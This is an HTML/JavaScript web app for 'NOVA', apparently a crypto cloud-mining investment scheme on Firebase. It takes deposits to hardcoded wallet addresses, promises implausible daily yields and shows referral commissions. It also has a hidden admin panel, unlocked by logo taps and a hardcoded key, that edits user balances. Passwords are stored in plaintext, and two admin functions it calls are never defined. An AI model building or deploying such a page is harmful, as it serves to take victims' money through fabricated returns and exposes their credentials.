<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA | Professional Mining</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --n-gold: #D4AF37; --n-bg: #F8FAFC; }
        body { background: var(--n-bg); font-family: 'Plus Jakarta Sans', sans-serif; color: #1e293b; overflow-x: hidden; }
        .nova-card { background: #ffffff; border: 1px solid #e2e8f0; border-radius: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.03); }
        .btn-gold { background: linear-gradient(135deg, #B8860B, #D4AF37); color: white; border-radius: 12px; font-weight: 700; transition: 0.2s; text-transform: uppercase; font-size: 11px; }
        .btn-gold:active { transform: scale(0.96); }
        .screen { display: none; padding-bottom: 110px; animation: fadeIn 0.3s ease-in; }
        .active-screen { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
        .nav-bar { position: fixed; bottom: 0; width: 100%; background: white; border-top: 1px solid #f1f5f9; display: flex; justify-content: space-around; padding: 15px 5px; z-index: 100; }
        .nav-item { color: #94a3b8; font-size: 10px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 4px; cursor: pointer; }
        .nav-item.active { color: #B8860B; }
        .p-input { background: #f1f5f9; border: 2px solid transparent; width: 100%; padding: 14px; border-radius: 12px; outline: none; margin-bottom: 10px; font-size: 13px; }
        .p-input:focus { border-color: #D4AF37; background: #fff; }
        .modal { display: none; position: fixed; inset: 0; background: white; z-index: 1000; padding: 20px; overflow-y: auto; }
        .badge-pending { background: #fff7ed; color: #ea580c; border: 1px solid #fed7aa; }
        .badge-success { background: #f0fdf4; color: #16a34a; border: 1px solid #bbf7d0; }
        .node-img { width: 100%; height: 140px; object-fit: cover; border-bottom: 1px solid #eee; }
    </style>
</head>
<body>

    <div id="global-msg" class="bg-slate-900 text-[#D4AF37] p-2.5 text-[10px] font-bold text-center uppercase tracking-widest border-b border-yellow-600/20">
        🚀 Worldwide Launch Offer: +10% Bonus on First Deposit!
    </div>

    <div id="auth-screen" class="min-h-screen flex flex-col p-8 justify-center active-screen bg-white">
        <div class="mb-10 text-center">
            <h1 onclick="handleTaps()" class="text-5xl font-black text-slate-900 tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h1>
            <p class="text-[9px] text-gray-400 font-bold uppercase tracking-[5px] mt-2">Institutional Mining Core</p>
        </div>
        <div class="space-y-2">
            <input type="text" id="u-id" placeholder="Access ID / Account" class="p-input">
            <input type="password" id="u-pw" placeholder="Security Passkey" class="p-input">
            <input type="text" id="adm-key" placeholder="System Master Access" class="hidden p-input border-yellow-500">
            <button onclick="auth()" class="w-full btn-gold py-4 shadow-lg shadow-yellow-600/10">Initialize Session</button>
            <p onclick="toggleM()" id="m-text" class="text-center text-[10px] mt-8 text-slate-400 font-bold uppercase cursor-pointer">Deploy New Node (Register)</p>
        </div>
    </div>

    <div id="app" class="hidden">
        <header class="p-5 flex justify-between items-center bg-white sticky top-0 z-50 border-b">
            <h2 class="font-black text-2xl tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h2>
            <div class="flex items-center gap-4">
                <a id="tg-link" href="https://t.me/yourchannel" target="_blank" class="text-sky-500 text-xl"><i class="fa-brands fa-telegram"></i></a>
                <i onclick="logout()" class="fa-solid fa-power-off text-slate-300 cursor-pointer"></i>
            </div>
        </header>

        <div id="dash-screen" class="screen active-screen px-4 pt-4">
            <div class="flex justify-between items-center mb-6 px-1">
                <div class="flex items-center gap-3">
                    <div class="w-10 h-10 rounded-full bg-slate-900 flex items-center justify-center border-2 border-[#D4AF37] shadow-lg">
                        <i class="fa-solid fa-user-shield text-[#D4AF37] text-xs"></i>
                    </div>
                    <div>
                        <p class="text-[8px] text-slate-400 font-black uppercase tracking-tighter">Verified Partner</p>
                        <h3 id="display-username" class="text-sm font-black text-slate-800 tracking-tight">@SESSION_USER</h3>
                    </div>
                </div>
                <div class="bg-green-50 px-3 py-1.5 rounded-full border border-green-100 flex items-center gap-2">
                    <span class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span>
                    <span class="text-[8px] font-black text-green-600 uppercase">ACTIVE-NODE-01</span>
                </div>
            </div>

            <div class="nova-card p-8 mb-6 bg-slate-900 text-white relative overflow-hidden shadow-2xl border-b-8 border-[#D4AF37]">
                <div class="relative z-10 text-center">
                    <p class="text-[10px] text-slate-400 font-bold uppercase tracking-[4px] mb-2">Available Liquidity</p>
                    <h1 id="main-bal" class="text-6xl font-black text-white tracking-tighter mb-8">$0.00</h1>
                    <div class="grid grid-cols-2 gap-6 border-t border-white/10 pt-6">
                        <div class="text-left">
                            <p class="text-[9px] text-slate-400 font-bold uppercase mb-1">Daily Yield</p>
                            <p id="v-daily" class="text-base font-black text-green-400">+$0.00</p>
                        </div>
                        <div class="text-right">
                            <p class="text-[9px] text-slate-400 font-bold uppercase mb-1">Status</p>
                            <p class="text-base font-black text-[#D4AF37]">MINING</p>
                        </div>
                    </div>
                </div>
                <div class="mt-6 bg-white/5 rounded-2xl p-4 flex justify-between items-center border border-white/10">
                    <span class="text-[9px] font-black text-slate-300 uppercase">Next Yield In:</span>
                    <span id="yield-timer" class="text-sm font-mono font-black text-yellow-500 tracking-widest">23:59:59</span>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-6">
                <button onclick="openModal('dep-modal')" class="nova-card p-5 flex flex-col items-center gap-3 active:scale-95 transition">
                    <i class="fa-solid fa-plus-circle text-2xl text-[#D4AF37]"></i>
                    <span class="text-[10px] font-black uppercase text-slate-700">Add Funds</span>
                </button>
                <button onclick="openModal('wd-modal')" class="nova-card p-5 flex flex-col items-center gap-3 active:scale-95 transition">
                    <i class="fa-solid fa-money-bill-transfer text-2xl text-slate-400"></i>
                    <span class="text-[10px] font-black uppercase text-slate-700">Withdraw</span>
                </button>
            </div>

            <div class="nova-card p-6 mb-6">
                <h3 class="text-[10px] font-black uppercase mb-5 flex items-center gap-3">
                    <i class="fa-solid fa-chart-line text-[#D4AF37]"></i> Team Performance
                </h3>
                <div class="grid grid-cols-3 gap-3">
                    <div class="bg-slate-50 p-4 rounded-2xl border border-slate-100 text-center">
                        <p id="direct-count" class="text-lg font-black text-slate-800">0</p>
                        <p class="text-[8px] font-bold text-slate-400 uppercase">Directs</p>
                    </div>
                    <div class="bg-slate-50 p-4 rounded-2xl border border-slate-100 text-center">
                        <p id="team-count" class="text-lg font-black text-slate-800">0</p>
                        <p class="text-[8px] font-bold text-slate-400 uppercase">Team</p>
                    </div>
                    <div class="bg-slate-50 p-4 rounded-2xl border border-slate-100 text-center">
                        <p id="team-earn" class="text-lg font-black text-green-600">$0.00</p>
                        <p class="text-[8px] font-bold text-slate-400 uppercase">Comm.</p>
                    </div>
                </div>
            </div>
        </div>

        <div id="mine-screen" class="screen px-4 pt-4">
            <h2 class="text-xl font-black mb-5 uppercase tracking-tighter">Mining <span class="text-[#D4AF37]">Nodes</span></h2>
            <div id="nodes-container" class="space-y-4"></div>
        </div>

        <div id="hist-screen" class="screen px-4 pt-4">
            <h2 class="text-xl font-black mb-5 uppercase tracking-tighter">Audit <span class="text-[#D4AF37]">History</span></h2>
            <div id="hist-container" class="space-y-3"></div>
        </div>

        <nav class="nav-bar">
            <div onclick="nav('dash-screen')" class="nav-item active" id="nav-dash"><i class="fa-solid fa-microchip text-lg"></i><span>DASH</span></div>
            <div onclick="nav('mine-screen')" class="nav-item" id="nav-mine"><i class="fa-solid fa-server text-lg"></i><span>NODES</span></div>
            <div onclick="nav('hist-screen')" class="nav-item" id="nav-hist"><i class="fa-solid fa-receipt text-lg"></i><span>AUDIT</span></div>
        </nav>
    </div>

    <div id="dep-modal" class="modal">
        <div class="flex justify-between items-center mb-6">
            <h2 class="text-2xl font-black uppercase">Liquidity</h2>
            <i onclick="closeModal('dep-modal')" class="fa-solid fa-circle-xmark text-slate-300 text-xl cursor-pointer"></i>
        </div>
        <div class="grid grid-cols-3 gap-2 mb-6">
            <div onclick="selD('Binance Pay')" class="dep-m nova-card p-2 text-center border-2 border-yellow-500 cursor-pointer" id="m-bin"><i class="fa-solid fa-coins text-yellow-500 mb-1"></i><p class="text-[8px] font-bold">Binance</p></div>
            <div onclick="selD('Trust Wallet')" class="dep-m nova-card p-2 text-center border-2 border-slate-100 cursor-pointer"><i class="fa-solid fa-shield text-blue-500 mb-1"></i><p class="text-[8px] font-bold">Trust</p></div>
            <div onclick="selD('MetaMask')" class="dep-m nova-card p-2 text-center border-2 border-slate-100 cursor-pointer"><i class="fa-solid fa-fox text-orange-500 mb-1"></i><p class="text-[8px] font-bold">MetaMask</p></div>
        </div>
        <div class="nova-card p-4 bg-slate-900 text-white mb-6 text-center">
            <p class="text-[8px] text-slate-400 font-bold uppercase mb-1">Official Wallet Address</p>
            <p id="dep-addr" class="text-[10px] font-mono break-all font-bold text-[#D4AF37]">TTSxm4pBK26RB4vXaa3Uo3hqGa5HdhxBDR</p>
        </div>
        <input type="number" id="dep-amt" placeholder="Amount ($)" class="p-input">
        <input type="text" id="dep-tid" placeholder="Transaction Hash (TID)" class="p-input">
        <button onclick="reqFin('Deposit')" class="w-full btn-gold py-4 mt-2">Initialize Funding</button>
    </div>

    <div id="wd-modal" class="modal">
        <div class="flex justify-between items-center mb-6">
            <h2 class="text-2xl font-black uppercase">Extract</h2>
            <i onclick="closeModal('wd-modal')" class="fa-solid fa-circle-xmark text-slate-300 text-xl cursor-pointer"></i>
        </div>
        <select id="wd-method" class="p-input font-bold">
            <option>Binance Pay</option>
            <option>Trust Wallet</option>
            <option>MetaMask</option>
        </select>
        <input type="number" id="wd-amt" placeholder="Amount ($)" class="p-input">
        <input type="text" id="wd-acc" placeholder="Recipient Address" class="p-input">
        <button onclick="reqFin('Withdrawal')" class="w-full btn-gold py-4 bg-slate-900">Request Withdrawal</button>
    </div>

    <div id="admin-panel" class="hidden fixed inset-0 bg-white z-[9999] p-6 overflow-y-auto">
        <div class="flex justify-between items-center mb-8 pb-4 border-b">
            <h2 class="font-black text-xs uppercase tracking-widest">Admin Command Center</h2>
            <button onclick="location.reload()" class="text-red-500 font-bold text-[10px]">RELOAD</button>
        </div>
        <div class="space-y-6">
            <div class="nova-card p-5 bg-slate-50">
                <h3 class="text-[10px] font-black mb-3">BALANCE INJECTION</h3>
                <input type="text" id="adm-uid" placeholder="User ID" class="p-input text-xs">
                <input type="number" id="adm-amt" placeholder="Amount" class="p-input text-xs">
                <button onclick="injectBal()" class="w-full btn-gold py-3">Update User</button>
            </div>
            <div id="adm-requests" class="space-y-4"></div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const config = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(config); const db = getFirestore(app);
        let user = localStorage.getItem('nova_user'); let login = true; let currentM = "Binance Pay";

        if(user) start(user);

        window.auth = async () => {
            const id = document.getElementById('u-id').value.toLowerCase().trim();
            const pw = document.getElementById('u-pw').value;
            if(document.getElementById('adm-key').value === "admin786") { 
                document.getElementById('admin-panel').classList.remove('hidden'); 
                loadAdmin(); 
                return; 
            }
            if(!id || !pw) return alert("Credentials Missing");
            const uRef = doc(db, "users", id); const s = await getDoc(uRef);
            if(!login) {
                if(s.exists()) return alert("Identity Exists");
                await setDoc(uRef, { balance: 0, password: pw, daily: 0 });
                localStorage.setItem('nova_user', id); start(id);
            } else if(s.exists() && s.data().password === pw) {
                localStorage.setItem('nova_user', id); start(id);
            } else alert("Access Error");
        };

        function start(id) {
            user = id; 
            document.getElementById('auth-screen').style.display='none'; 
            document.getElementById('app').classList.remove('hidden');
            document.getElementById('display-username').innerText = `@${id.toUpperCase()}`;
            
            onSnapshot(doc(db, "users", id), d => {
                const data = d.data();
                document.getElementById('main-bal').innerText = "$" + (data.balance || 0).toFixed(2);
                document.getElementById('v-daily').innerText = "Node Yield: +$" + (data.daily || 0).toFixed(2) + " / 24H";
            });
            loadNodes(); 
            loadHistory();
            startYieldTimer();
        }

        function startYieldTimer() {
            setInterval(() => {
                const now = new Date();
                const tomorrow = new Date(now.getFullYear(), now.getMonth(), now.getDate() + 1);
                const diff = tomorrow - now;
                const h = Math.floor(diff / 3600000).toString().padStart(2, '0');
                const m = Math.floor((diff % 3600000) / 60000).toString().padStart(2, '0');
                const s = Math.floor((diff % 60000) / 1000).toString().padStart(2, '0');
                const timerEl = document.getElementById('yield-timer');
                if(timerEl) timerEl.innerText = `${h}:${m}:${s}`;
            }, 1000);
        }

        function loadNodes() {
            const c = document.getElementById('nodes-container'); 
            c.innerHTML = "";
            const plans = [
                {p: 20, d: 1.60, n: "Nova Antminer S19", img: "https://images.unsplash.com/photo-1624555130581-1d9cca783bc0?w=400", spec: "110 TH/s | Air Cooled"},
                {p: 100, d: 8.50, n: "Nova Whatsminer M30", img: "https://images.unsplash.com/photo-1518770660439-4636190af475?w=400", spec: "134 TH/s | Stable Power"},
                {p: 600, d: 58.00, n: "Nova Liquid-Cool X5", img: "https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=400", spec: "200 TH/s | Water Tech"},
                {p: 2500, d: 300.00, n: "Corporate Giant", img: "https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=400", spec: "Tier 4 Data Center", hot: true}
            ];
            plans.forEach(plan => {
                c.innerHTML += `
                <div class="nova-card overflow-hidden relative ${plan.hot ? 'border-2 border-yellow-500' : ''}">
                    <img src="${plan.img}" class="node-img">
                    <div class="p-4">
                        <div class="flex justify-between items-start mb-2">
                            <div><h3 class="text-xs font-black uppercase">${plan.n}</h3><p class="text-[8px] text-slate-400 font-bold">${plan.spec}</p></div>
                            <p class="text-sm font-black">$${plan.p}</p>
                        </div>
                        <div class="flex justify-between items-center mt-4">
                            <p class="text-[9px] font-black text-green-600">Daily: +$${plan.d}</p>
                            <button onclick="buyNode(${plan.p},${plan.d})" class="btn-gold px-5 py-2">Deploy</button>
                        </div>
                    </div>
                </div>`;
            });
        }

        window.buyNode = async (p, d) => {
            const uR = doc(db, "users", user); const s = await getDoc(uR);
            if(s.data().balance < p) return alert("Low Liquidity sweetie!");
            await updateDoc(uR, { balance: s.data().balance - p, daily: (s.data().daily || 0) + parseFloat(d) });
            alert("Mining Session Started!");
        };

        window.selD = (m) => { 
            currentM = m; document.querySelectorAll('.dep-m').forEach(e => e.style.borderColor = "#f1f5f9");
            event.currentTarget.style.borderColor = "#D4AF37";
            const addr = document.getElementById('dep-addr');
            addr.innerText = m === 'Binance Pay' ? "TTSxm4pBK26RB4vXaa3Uo3hqGa5HdhxBDR" : (m === 'Trust Wallet' ? "0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37" : "0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2");
        };

        window.reqFin = async (type) => {
            const amt = parseFloat(document.getElementById(type=='Deposit'?'dep-amt':'wd-amt').value);
            const ref = document.getElementById(type=='Deposit'?'dep-tid':'wd-acc').value;
            if(!amt || !ref) return alert("Fill all fields sweetie");
            const uR = doc(db, "users", user); const s = await getDoc(uR);
            if(type === 'Withdrawal' && s.data().balance < amt) return alert("Insufficient Balance");
            if(type === 'Withdrawal') await updateDoc(uR, { balance: s.data().balance - amt });
            await addDoc(collection(db, "logs"), { user, type, amount: amt, status: 'Pending', time: Date.now(), method: type=='Deposit'?currentM:document.getElementById('wd-method').value, ref });
            alert("Protocol Submitted!"); closeModal(type=='Deposit'?'dep-modal':'wd-modal');
        };

        function loadHistory() {
            onSnapshot(query(collection(db, "logs"), where("user", "==", user)), s => {
                const c = document.getElementById('hist-container'); c.innerHTML = "";
                let logs = []; s.forEach(d => logs.push(d.data()));
                logs.sort((a, b) => b.time - a.time).forEach(r => {
                    c.innerHTML += `<div class="nova-card p-4 flex justify-between items-center">
                        <div><p class="text-[8px] font-black text-slate-400 uppercase">${r.type}</p><p class="text-xs font-bold">$${r.amount.toFixed(2)}</p></div>
                        <span class="text-[9px] font-bold px-3 py-1 rounded-full ${r.status=='Success'?'badge-success':'badge-pending'}">${r.status}</span>
                    </div>`;
                });
            });
        }

        window.logout = () => { localStorage.removeItem('nova_user'); location.reload(); };
        window.handleTaps = () => { window.taps = (window.taps || 0) + 1; if(window.taps >= 6) document.getElementById('adm-key').classList.remove('hidden'); };
        window.toggleM = () => { login = !login; document.getElementById('m-text').innerText = login ? "Deploy New Node (Register)" : "Return to Access"; };
        window.openModal = (id) => document.getElementById(id).style.display = 'block';
        window.closeModal = (id) => document.getElementById(id).style.display = 'none';
        window.nav = (id) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
            document.getElementById(id).classList.add('active-screen');
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            document.getElementById('nav-' + id.split('-')[0]).classList.add('active');
        };
    </script>
</body>
</html>
